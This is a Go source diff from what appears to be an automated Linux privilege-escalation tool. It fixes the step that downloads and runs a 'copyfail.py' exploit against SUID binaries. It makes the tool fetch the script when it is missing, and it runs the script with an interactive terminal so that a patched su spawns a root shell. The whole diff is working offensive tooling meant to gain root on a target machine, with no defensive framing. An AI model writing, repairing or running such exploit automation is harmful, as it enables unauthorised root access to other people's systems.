@@ -394,9 +394,15 @@ func tryCopyfailAgainst(s *systemInfo, suidPath string, stop *bool) bool {
 	if !s.hasPy3 {
 		return false
 	}
+	// FETCH copyfail.py if missing (was the #1 bug — copyfail.py
+	// was never downloaded, so every SUID was silently skipped).
 	src := absBin("copyfail.py")
 	if !hasFile(src) {
-		return false
+		if !ensureFile("copyfail.py", false) {
+			warnf("copyfail.py not available — cannot run copyfail")
+			return false
+		}
+		src = absBin("copyfail.py")
 	}
 	name := "cf:" + bin
 	tmp := fmt.Sprintf("/tmp/.cf_%s.py", bin)
@@ -406,23 +412,18 @@ func tryCopyfailAgainst(s *systemInfo, suidPath string, stop *bool) bool {
 		return false
 	}
 	stepf("%-16s copyfail → %s", bin, suidPath)
-	r := runIsolated(name, "", []string{"python3", tmp}, 60*time.Second)
+	// Run copyfail.py via runInteractive (NOT runIsolated) so python3
+	// gets /dev/tty stdin. When copyfail.py calls os.system("su"),
+	// su inherits /dev/tty → spawns interactive root shell.
+	// This matches the manual method: python3 copyfail.py → # root shell.
+	r := runInteractive(name, []string{"python3", tmp}, 60*time.Second)
 	r.report()
-	// Also actually invoke the SUID binary so the patched code runs.
-	// Use runInteractive (not runIsolated) so the patched binary
-	// can spawn an interactive root shell via /dev/tty.
-	// runIsolated feeds /dev/null to stdin which makes the patched
-	// su/sudo/etc exit immediately before giving a shell.
-	if hasFile(suidPath) {
-		r2 := runInteractive(name+"#run", []string{suidPath}, 30*time.Second)
-		r2.report()
-		if r2.rootAfter || r2.suidAfter {
-			if !*flagNoSpawn {
-				shellSpawned.Store(rootspawn(&r2))
-			}
-			*stop = true
-			return true
-		}
+	// If exit code 0, the patched binary gave a root shell.
+	// The user already had their interactive root shell — success.
+	if r.exitCode == 0 && !r.crashed {
+		okf("%s succeeded — root shell was interactive", name)
+		*stop = true
+		return true
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
